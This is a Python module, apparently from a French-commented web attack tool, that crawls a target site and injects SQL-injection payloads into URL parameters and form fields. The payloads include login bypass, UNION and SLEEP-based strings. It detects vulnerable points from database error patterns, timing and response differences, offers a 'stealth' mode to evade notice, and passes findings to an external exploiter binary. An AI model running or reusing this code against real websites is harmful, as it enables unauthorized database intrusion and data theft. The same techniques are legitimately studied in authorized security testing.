#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
import concurrent.futures
import sys
import os
import json
import subprocess
import urllib.parse
from bs4 import BeautifulSoup

# Import des modules utilitaires
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from webhunterx.utils import logger, http_tools

# Chargement des payloads
def load_payloads():
    """Charge les payloads SQLi depuis le fichier"""
    payloads_file = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 
                               "payloads", "sqli.txt")
    
    # Payloads par défaut si le fichier n'existe pas
    default_payloads = [
        "' OR '1'='1", 
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR '1'='1' --",
        "admin' --",
        "admin' #",
        "' UNION SELECT 1,2,3 --",
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT 1,2,3,4,5 --",
        "' AND (SELECT 6335 FROM (SELECT(SLEEP(5)))hYFz) --",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) --",
        "' AND SLEEP(5) --",
        "' AND 1=2 --"
    ]
    
    try:
        if os.path.exists(payloads_file):
            with open(payloads_file, 'r') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            return payloads
        else:
            return default_payloads
    except:
        return default_payloads

# Patterns pour la détection des erreurs SQL
SQL_ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*MySQL", 
        r"Warning.*mysql_.*", 
        r"MySQL Query fail.*",
        r"SQL syntax.*MariaDB server"
    ],
    "PostgreSQL": [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_.*",
        r"Warning.*PostgreSQL"
    ],
    "Microsoft SQL Server": [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"SQLServer JDBC Driver",
        r"Warning.*mssql_.*"
    ],
    "Oracle": [
        r"Oracle.*Driver",
        r"Warning.*oci_.*",
        r"Warning.*ora_.*"
    ],
    "SQLite": [
        r"SQLite/JDBCDriver",
        r"Warning.*sqlite_.*"
    ]
}

class SQLi:
    def __init__(self, target, threads=5, stealth=False):
        self.target = target
        self.threads = threads
        self.stealth = stealth
        self.log = logger.get_logger()
        self.payloads = load_payloads()
        self.vulnerable_points = []
        self.crawled_urls = []
        self.forms = []
        
        # Mode furtif
        if self.stealth:
            self.log.info("Mode furtif activé pour le test SQLi")
            http_tools.set_stealth_mode(True)
    
    def run_scan(self):
        """Exécute le scan complet pour SQLi"""
        self.log.info(f"Démarrage du scan SQLi sur {self.target}")
        
        # Étape 1: Crawler le site pour trouver des URLs et formulaires
        self._crawl_target()
        
        # Étape 2: Tester les URLs pour les GET parameters
        self._test_urls()
        
        # Étape 3: Tester les formulaires pour les POST injections
        self._test_forms()
        
        # Afficher les résultats
        self._summarize_results()
        
        return {
            "vulnerable_urls": [v for v in self.vulnerable_points if v["type"] == "url"],
            "vulnerable_forms": [v for v in self.vulnerable_points if v["type"] == "form"]
        }
    
    def _crawl_target(self):
        """Crawl le site cible pour trouver des URLs et formulaires"""
        self.log.info(f"Crawling de {self.target} pour trouver des points d'injection potentiels")
        
        # Appel au crawler (on pourrait aussi réutiliser celui existant)
        try:
            from webhunterx.core import crawler
            crawl_results = crawler.run(self.target, self.threads, self.stealth)
            
            if "urls" in crawl_results:
                self.crawled_urls = crawl_results["urls"]
            if "forms" in crawl_results:
                self.forms = crawl_results["forms"]
            
            self.log.info(f"Crawling terminé: {len(self.crawled_urls)} URLs et {len(self.forms)} formulaires trouvés")
            
        except ImportError:
            # Crawler minimal si le module crawler n'est pas encore implémenté
            self.log.warning("Module crawler non disponible, utilisation du crawler minimaliste")
            self._minimal_crawl()
    
    def _minimal_crawl(self):
        """Crawler minimaliste pour trouver des URLs avec paramètres et des formulaires"""
        visited = set()
        to_visit = [self.target]
        
        while to_visit and len(visited) < 20:  # Limite à 20 pages
            current_url = to_visit.pop(0)
            base_url = current_url.split('?')[0]  # URL sans paramètres
            
            if base_url in visited:
                continue
                
            visited.add(base_url)
            self.log.debug(f"Crawling de {current_url}")
            
            try:
                # Ajouter un délai en mode furtif
                if self.stealth:
                    time.sleep(1)
                
                response = http_tools.send_request(current_url)
                if not response:
                    continue
                    
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Trouver les liens
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    
                    # Normaliser l'URL
                    if href.startswith('/'):
                        if self.target.endswith('/'):
                            href = self.target[:-1] + href
                        else:
                            href = self.target + href
                    elif not href.startswith(('http://', 'https://')):
                        if self.target.endswith('/'):
                            href = self.target + href
                        else:
                            href = self.target + '/' + href
                    
                    # Si l'URL a des paramètres, l'ajouter aux URLs à tester
                    if '?' in href and any(param in href for param in ['=', '&']):
                        if href not in self.crawled_urls:
                            self.crawled_urls.append(href)
                    
                    # Ajouter l'URL à visiter si dans le même domaine
                    if self.target.split('//')[1].split('/')[0] in href:
                        if href not in visited and href not in to_visit:
                            to_visit.append(href)
                
                # Trouver les formulaires
                for form in soup.find_all('form'):
                    form_info = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'get').lower(),
                        'inputs': []
                    }
                    
                    # Normaliser l'action
                    if form_info['action'].startswith('/'):
                        if self.target.endswith('/'):
                            form_info['action'] = self.target[:-1] + form_info['action']
                        else:
                            form_info['action'] = self.target + form_info['action']
                    elif not form_info['action'].startswith(('http://', 'https://')):
                        if self.target.endswith('/'):
                            form_info['action'] = self.target + form_info['action']
                        else:
                            form_info['action'] = self.target + '/' + form_info['action']
                    
                    # Si aucune action n'est spécifiée, utiliser l'URL actuelle
                    if not form_info['action']:
                        form_info['action'] = current_url
                    
                    # Collecter les inputs
                    for input_field in form.find_all(['input', 'select', 'textarea']):
                        field_type = input_field.get('type', '')
                        if field_type.lower() not in ['submit', 'button', 'image', 'reset']:
                            name = input_field.get('name', '')
                            if name:
                                form_info['inputs'].append({
                                    'name': name,
                                    'type': field_type
                                })
                    
                    # N'ajouter que les formulaires avec des inputs
                    if form_info['inputs']:
                        self.forms.append(form_info)
                
            except Exception as e:
                self.log.error(f"Erreur lors du crawling de {current_url}: {str(e)}")
        
        self.log.info(f"Crawler minimal terminé: {len(self.crawled_urls)} URLs et {len(self.forms)} formulaires trouvés")
    
    def _test_urls(self):
        """Teste les URLs avec des payloads SQLi"""
        if not self.crawled_urls:
            self.log.warning("Aucune URL à tester pour SQLi")
            return
            
        self.log.info(f"Test de {len(self.crawled_urls)} URLs pour SQLi")
        
        # Filtrer seulement les URLs avec des paramètres
        urls_with_params = [url for url in self.crawled_urls if '?' in url]
        if not urls_with_params:
            self.log.warning("Aucune URL avec paramètres trouvée")
            return
            
        self.log.info(f"Test de {len(urls_with_params)} URLs avec paramètres")
        
        # Tester chaque URL en parallèle
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._test_url, url): url for url in urls_with_params}
            for future in concurrent.futures.as_completed(futures):
                url = futures[future]
                try:
                    future.result()
                except Exception as e:
                    self.log.error(f"Erreur lors du test de {url}: {str(e)}")
    
    def _test_url(self, url):
        """Teste une URL avec des payloads SQLi"""
        self.log.debug(f"Test SQLi sur l'URL: {url}")
        
        # Extraire les paramètres
        base_url, params = url.split('?', 1) if '?' in url else (url, '')
        if not params:
            return
            
        # Décomposer les paramètres
        param_pairs = params.split('&')
        
        # Tester chaque paramètre
        for i, pair in enumerate(param_pairs):
            if '=' not in pair:
                continue
                
            name, value = pair.split('=', 1)
            
            # Tester chaque payload sur ce paramètre
            for payload in self.payloads:
                # Créer une nouvelle liste de paramètres avec le payload injecté
                new_params = param_pairs.copy()
                new_params[i] = f"{name}={urllib.parse.quote_plus(payload)}"
                
                # Construire l'URL d'injection
                inject_url = f"{base_url}?{'&'.join(new_params)}"
                
                # Ajouter un délai en mode furtif
                if self.stealth:
                    time.sleep(0.5)
                
                # Envoyer la requête
                try:
                    start_time = time.time()
                    response = http_tools.send_request(inject_url)
                    response_time = time.time() - start_time
                    
                    if response:
                        # Vérifier les indicateurs de vulnérabilité
                        sql_error = self._check_sql_errors(response.text)
                        time_based = self._check_time_based(response_time, payload)
                        content_diff = self._check_content_diff(url, inject_url, base_url)
                        
                        if sql_error or time_based or content_diff:
                            vuln_type = []
                            if sql_error:
                                vuln_type.append("error-based")
                            if time_based:
                                vuln_type.append("time-based")
                            if content_diff:
                                vuln_type.append("boolean-based")
                            
                            vuln_info = {
                                "type": "url",
                                "url": inject_url,
                                "param": name,
                                "payload": payload,
                                "vulnerability_type": vuln_type,
                                "dbms": sql_error if sql_error else "Unknown"
                            }
                            
                            self.vulnerable_points.append(vuln_info)
                            self.log.warning(f"Vulnérabilité SQLi trouvée: {inject_url}, type: {', '.join(vuln_type)}")
                except Exception as e:
                    self.log.error(f"Erreur lors du test de {inject_url}: {str(e)}")
    
    def _test_forms(self):
        """Teste les formulaires avec des payloads SQLi"""
        if not self.forms:
            self.log.warning("Aucun formulaire à tester pour SQLi")
            return
            
        self.log.info(f"Test de {len(self.forms)} formulaires pour SQLi")
        
        # Tester chaque formulaire en parallèle
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self._test_form, form): form for form in self.forms}
            for future in concurrent.futures.as_completed(futures):
                form = futures[future]
                try:
                    future.result()
                except Exception as e:
                    self.log.error(f"Erreur lors du test du formulaire {form.get('action', 'unknown')}: {str(e)}")
    
    def _test_form(self, form):
        """Teste un formulaire avec des payloads SQLi"""
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = form.get('inputs', [])
        
        if not action or not inputs:
            return
            
        self.log.debug(f"Test SQLi sur le formulaire: {action}, méthode: {method}")
        
        # Tester chaque champ d'entrée
        for input_field in inputs:
            field_name = input_field.get('name', '')
            if not field_name:
                continue
                
            # Tester chaque payload sur ce champ
            for payload in self.payloads:
                # Préparer les données du formulaire
                form_data = {}
                for inp in inputs:
                    inp_name = inp.get('name', '')
                    if inp_name == field_name:
                        form_data[inp_name] = payload
                    else:
                        # Valeur par défaut pour les autres champs
                        form_data[inp_name] = 'value1'
                
                # Ajouter un délai en mode furtif
                if self.stealth:
                    time.sleep(0.5)
                
                # Envoyer la requête
                try:
                    start_time = time.time()
                    if method == 'post':
                        response = http_tools.send_request(action, method='POST', data=form_data)
                    else:  # GET
                        params = '&'.join([f"{k}={urllib.parse.quote_plus(v)}" for k, v in form_data.items()])
                        url = f"{action}?{params}"
                        response = http_tools.send_request(url)
                        
                    response_time = time.time() - start_time
                    
                    if response:
                        # Vérifier les indicateurs de vulnérabilité
                        sql_error = self._check_sql_errors(response.text)
                        time_based = self._check_time_based(response_time, payload)
                        
                        if sql_error or time_based:
                            vuln_type = []
                            if sql_error:
                                vuln_type.append("error-based")
                            if time_based:
                                vuln_type.append("time-based")
                            
                            vuln_info = {
                                "type": "form",
                                "action": action,
                                "method": method,
                                "field": field_name,
                                "payload": payload,
                                "vulnerability_type": vuln_type,
                                "dbms": sql_error if sql_error else "Unknown"
                            }
                            
                            self.vulnerable_points.append(vuln_info)
                            self.log.warning(f"Vulnérabilité SQLi trouvée dans le formulaire: {action}, champ: {field_name}, type: {', '.join(vuln_type)}")
                        
                except Exception as e:
                    self.log.error(f"Erreur lors du test du formulaire {action}, champ {field_name}: {str(e)}")
    
    def _check_sql_errors(self, content):
        """Vérifie si la réponse contient des erreurs SQL"""
        for dbms, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.I):
                    return dbms
        return None
    
    def _check_time_based(self, response_time, payload):
        """Vérifie si la réponse a pris du temps (indiquant une injection time-based)"""
        if "SLEEP" in payload.upper() and response_time > 4.5:  # Pour les payloads avec SLEEP(5)
            return True
        return False
    
    def _check_content_diff(self, original_url, injected_url, base_url):
        """Vérifie si la réponse de l'URL injectée diffère significativement de l'original"""
        try:
            # Obtenir la réponse originale
            original_response = http_tools.send_request(original_url)
            
            # Obtenir la réponse avec "AND 1=2" (devrait être différente si vulnérable)
            if '?' not in injected_url:
                return False
                
            base, params = injected_url.split('?', 1)
            params_list = params.split('&')
            modified_params = []
            
            for param in params_list:
                if '=' not in param:
                    modified_params.append(param)
                    continue
                name, value = param.split('=', 1)
                # Remplacer le payload actuel par "AND 1=2"
                modified_params.append(f"{name}={urllib.parse.quote_plus(' AND 1=2')}")
            
            false_url = f"{base}?{'&'.join(modified_params)}"
            false_response = http_tools.send_request(false_url)
            
            # Comparer les réponses
            if original_response and false_response:
                # Si longueurs très différentes, probable bool-based SQLi
                len_diff = abs(len(original_response.text) - len(false_response.text))
                if len_diff > 100 and len_diff / max(len(original_response.text), len(false_response.text)) > 0.2:
                    return True
            
        except Exception as e:
            self.log.error(f"Erreur lors de la vérification bool-based: {str(e)}")
        
        return False
    
    def _summarize_results(self):
        """Résume les résultats du scan"""
        vulnerable_urls = [v for v in self.vulnerable_points if v["type"] == "url"]
        vulnerable_forms = [v for v in self.vulnerable_points if v["type"] == "form"]
        
        self.log.info("=== Résumé du scan SQLi ===")
        self.log.info(f"URLs testées: {len(self.crawled_urls)}")
        self.log.info(f"Formulaires testés: {len(self.forms)}")
        self.log.info(f"URLs vulnérables: {len(vulnerable_urls)}")
        self.log.info(f"Formulaires vulnérables: {len(vulnerable_forms)}")
    
    def exploit_vulnerabilities(self):
        """Exploite les vulnérabilités SQLi trouvées en utilisant le module Go"""
        if not self.vulnerable_points:
            self.log.warning("Aucune vulnérabilité SQLi à exploiter")
            return None
            
        results = {
            "exploited": [],
            "failed": []
        }
        
        self.log.info(f"Tentative d'exploitation de {len(self.vulnerable_points)} vulnérabilités SQLi")
        
        # Chemin vers l'outil sql_exploiter.go
        exploiter_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 
                                      "modules_go", "sql_exploiter")
        
        if not os.path.exists(exploiter_path):
            self.log.error(f"L'outil d'exploitation sql_exploiter n'existe pas à {exploiter_path}")
            return results
        
        # Exploiter chaque point vulnérable
        for vuln in self.vulnerable_points:
            try:
                self.log.info(f"Exploitation de la vulnérabilité: {vuln}")
                
                # Préparation des données pour l'exploiteur
                exploit_data = {
                    "url": vuln.get("url", ""),
                    "action": vuln.get("action", ""),
                    "method": vuln.get("method", "GET"),
                    "param": vuln.get("param", vuln.get("field", "")),
                    "payload": vuln.get("payload", ""),
                    "vulnerability_type": vuln.get("vulnerability_type", []),
                    "dbms": vuln.get("dbms", "Unknown")
                }
                
                # Écrire les données dans un fichier temporaire
                temp_file = f"/tmp/sqli_exploit_{int(time.time())}.json"
                with open(temp_file, 'w') as f:
                    json.dump(exploit_data, f)
                
                # Exécuter l'outil d'exploitation
                cmd = [exploiter_path, "-f", temp_file]
                self.log.debug(f"Exécution de la commande: {' '.join(cmd)}")
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                
                if process.returncode == 0:
                    # Analyser la sortie
                    try:
                        exploit_result = json.loads(stdout.decode('utf-8'))
                        results["exploited"].append({
                            "vulnerability": vuln,
                            "result": exploit_result
                        })
                        self.log.info(f"Exploitation réussie pour {vuln['type']} {vuln.get('url', vuln.get('action', ''))}")
                    except json.JSONDecodeError:
                        results["failed"].append({
                            "vulnerability": vuln,
                            "error": "Impossible d'analyser la sortie de l'exploiteur"
                        })
                else:
                    results["failed"].append({
                        "vulnerability": vuln,
                        "error": stderr.decode('utf-8')
                    })
                    self.log.error(f"Échec de l'exploitation pour {vuln['type']} {vuln.get('url', vuln.get('action', ''))}: {stderr.decode('utf-8')}")
                
                # Nettoyer le fichier temporaire
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    
            except Exception as e:
                results["failed"].append({
                    "vulnerability": vuln,
                    "error": str(e)
                })
                self.log.error(f"Erreur lors de l'exploitation de {vuln['type']} {vuln.get('url', vuln.get('action', ''))}: {str(e)}")
        
        self.log.info(f"Exploitation terminée: {len(results['exploited'])} réussies, {len(results['failed'])} échouées")
        return results

def run(target, threads=5, stealth=False):
    """Fonction principale pour lancer le module SQLi"""
    scanner = SQLi(target, threads, stealth)
    vulnerabilities = scanner.run_scan()
    
    # Retourner les résultats
    return vulnerabilities

def exploit(target, vulnerabilities, threads=5, stealth=False):
    """Fonction pour exploiter les vulnérabilités SQLi"""
    if not vulnerabilities:
        return {"error": "Aucune vulnérabilité SQLi à exploiter"}
    
    scanner = SQLi(target, threads, stealth)
    scanner.vulnerable_points = vulnerabilities
    return scanner.exploit_vulnerabilities()

if __name__ == "__main__":
    # Test direct du module
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
        vulns = run(target_url)
        print(json.dumps(vulns, indent=4)) 